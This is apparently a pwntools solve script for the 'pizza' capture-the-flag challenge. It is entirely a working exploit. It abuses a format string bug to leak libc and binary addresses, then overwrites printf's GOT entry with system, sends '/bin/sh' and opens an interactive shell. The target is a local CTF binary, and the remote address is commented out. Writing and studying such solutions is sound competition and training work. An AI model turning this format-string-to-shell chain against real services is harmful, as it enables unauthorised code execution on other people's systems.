from pwn import *

# context.log_level = 'debug'

# r = remote('chall.lac.tf', 31134)
r = process('./pizza_patched')
elf = ELF('./pizza_patched')
libc = ELF('./libc.so.6')
context.binary = elf

def custom(data):
	r.sendlineafter(b"> ", b"12")
	r.sendlineafter(b"topping: ", data)

custom(b'%47$p,%49$p')
custom(b'0')
custom(b'0')
r.recvuntil(b'Here are the toppings that you chose:\n')
recv = r.recvline()
libc_addr, elf_addr = recv.decode().strip('\n').split(',')
libc_addr, elf_addr = int(libc_addr, 0), int(elf_addr, 0)
libc.address = libc_addr-(0x7efe01d1524a-0x7efe01cee000)
elf.address  = elf_addr -(0x564aed3ee189-0x564aed3ed000)
log.info(f'{hex(libc.address) = }, {libc.address = }')
log.info(f'{hex(elf.address) = } , {elf.address = }')
r.sendlineafter(b'(y/n): ', b'y')

fmt_str = fmtstr_payload(6, {elf.got.printf: libc.symbols.system}, write_size='short')
assert len(fmt_str) < 100
custom(fmt_str)
custom(b'/bin/sh')
custom(b'0')

r.interactive()